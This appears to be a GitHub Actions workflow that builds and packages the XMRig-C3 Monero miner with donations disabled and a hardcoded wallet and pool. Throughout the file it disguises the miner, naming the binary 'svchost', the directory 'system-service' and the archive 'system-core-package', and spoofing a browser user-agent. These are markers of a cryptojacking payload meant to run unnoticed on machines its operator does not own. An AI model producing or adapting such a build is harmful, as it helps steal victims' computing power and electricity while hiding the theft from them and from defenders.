# .github/workflows/build-miner.yml

name: Build and Package Miner

# 触发条件：
# workflow_dispatch: 允许在 GitHub Actions 页面手动触发此工作流
on:
  workflow_dispatch:

jobs:
  build:
    name: Build for Linux (x64) on Ubuntu 22.04 (for compatibility with 24.04)
    runs-on: ubuntu-latest

    # 定义环境变量
    env:
      DIR_NAME: system-service
      EXE_NAME: svchost
      WALLET_ADDR: 47Z5E787p8bHJEEc2Bf878K86LHQcbKT6f8KEsU7ocmnQPKHNbHHdMNc4dW6drrR4egpHmkM2jTWkP1tg4wymd7DAtJD37L
      PACKAGE_NAME: system-core-package

    steps:
    - name: 1. 安装编译所需的依赖环境
      run: |
        sudo apt-get update
        sudo apt-get install -y git build-essential cmake automake libtool autoconf

    - name: 2. 下载 XMRig-C3 源码并重命名目录
      run: git clone https://github.com/C3Pool/xmrig-C3.git ${{ env.DIR_NAME }}

    - name: 3. 自动修改捐赠级别为 0
      run: |
        sed -i 's/constexpr const int kDefaultDonateLevel =.*/constexpr const int kDefaultDonateLevel = 0;/g' ${{ env.DIR_NAME }}/src/donate.h
        sed -i 's/constexpr const int kMinimumDonateLevel =.*/constexpr const int kMinimumDonateLevel = 0;/g' ${{ env.DIR_NAME }}/src/donate.h
        echo "✅ Donation level successfully set to 0."

    - name: 4. 创建 config.json 配置文件
      run: |
        cat <<EOF > ./${{ env.DIR_NAME }}/src/config.json
        {
            "autosave": true,
            "cpu": {
                "enabled": true,
                "huge-pages": true,
                "hw-aes": null,
                "priority": null,
                "memory-pool": true,
                "yield": true,
                "asm": true,
                "max-threads-hint": 75
            },
            "randomx": {
                "init": -1,
                "mode": "auto",
                "1gb-pages": false,
                "rdmsr": true,
                "wrmsr": true,
                "numa": true
            },
            "pools": [
                {
                    "algo": null,
                    "coin": null,
                    "url": "auto.c3pool.org:19333",
                    "user": "${{ env.WALLET_ADDR }}",
                    "pass": "cloud-miner-01",
                    "keepalive": true,
                    "enabled": true,
                    "tls": true,
                    "tls-fingerprint": null
                }
            ],
            "log-file": null,
            "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/108.0.0.0 Safari/537.36",
            "print-time": 300,
            "health-print-time": 300,
            "pause-on-battery": true
        }
        EOF
        echo "✅ config.json created with your wallet address."
        
    - name: 5. 【诊断步骤】显示文件结构和权限
      run: |
        echo "🔍 Displaying file structure and permissions for debugging..."
        ls -lR ${{ env.DIR_NAME }}

    - name: 6. 构建静态依赖库
      # 关键修正：将工作目录切换到 scripts 内部
      working-directory: ${{ env.DIR_NAME }}/scripts
      run: |
        echo "📦 Changing directory to $(pwd)"
        echo "📦 Granting execute permission to all shell scripts in this directory..."
        # 关键修正：为所有可能被调用的脚本添加执行权限
        chmod +x ./*.sh
        
        echo "📦 Running the dependency builder script..."
        # 关键修正：现在在正确的目录下执行脚本
        ./build_deps.sh

    - name: 7. 编译主程序
      working-directory: ${{ env.DIR_NAME }}
      run: |
        echo "🚀 Compiling the main program with static links..."
        mkdir build && cd build
        cmake .. -DXMRIG_DEPS=scripts/deps -DCMAKE_BUILD_TYPE=Release
        make -j$(nproc)

    - name: 8. 准备并打包最终文件
      run: |
        mkdir -p final-package
        mv ${{ env.DIR_NAME }}/build/xmrig final-package/${{ env.EXE_NAME }}
        mv ${{ env.DIR_NAME }}/src/config.json final-package/config.json
        echo "✅ Final package directory prepared."
        
        tar -czvf ${{ env.PACKAGE_NAME }}.tar.gz -C final-package/ .
        echo "✅ Created ${{ env.PACKAGE_NAME }}.tar.gz"

    - name: 9. 上传产物包
      uses: actions/upload-artifact@v4
      with:
        name: ${{ env.PACKAGE_NAME }}
        path: ${{ env.PACKAGE_NAME }}.tar.gz
